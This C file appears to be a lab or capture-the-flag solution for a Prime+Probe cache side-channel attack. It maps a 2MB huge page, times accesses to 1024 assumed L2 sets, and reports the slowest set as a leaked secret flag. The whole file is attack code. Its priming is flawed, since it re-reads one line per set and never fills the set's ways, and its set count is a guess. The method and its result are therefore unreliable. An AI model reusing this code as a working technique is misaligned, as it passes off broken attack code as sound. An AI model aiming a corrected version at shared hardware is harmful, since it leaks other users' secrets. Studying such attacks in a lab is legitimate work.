#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>

#define BUFF_SIZE (1<<21) // 2MB

int main(int argc, char const *argv[]) {
    int flag = -1;

    // === Allocate large buffer using huge page ===
    uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB,
                        -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap() error\n");
        exit(1);
    }

    // === Prime and Probe ===

    int slowest_set = -1;
    uint64_t slowest_time = 0;

    // Assume L2 cache has 1024 sets (adjust if different)
    int NUM_SETS = 1024;

    for (int set_index = 0; set_index < NUM_SETS; set_index++) {
        // Access a few addresses that map to this set
        volatile uint8_t *addr = buf + (set_index * 64); // 64B cache line size

        uint64_t total_time = 0;

        // Repeat multiple times to get stable measurements
        for (int sample = 0; sample < 1000; sample++) {
            *addr; // Prime the cache
        }

        // Small busy-wait
        for (volatile int j = 0; j < 10000; j++);

        // Now measure the probe time
        for (int sample = 0; sample < 10; sample++) {
            total_time += measure_one_block_access_time((uint64_t)addr);
        }

        uint64_t average_time = total_time / 10;

        if (average_time > slowest_time) {
            slowest_time = average_time;
            slowest_set = set_index;
        }
    }

    // The slowest set corresponds to the secret flag
    flag = slowest_set;

    printf("Flag: %d\n", flag);
    return 0;
}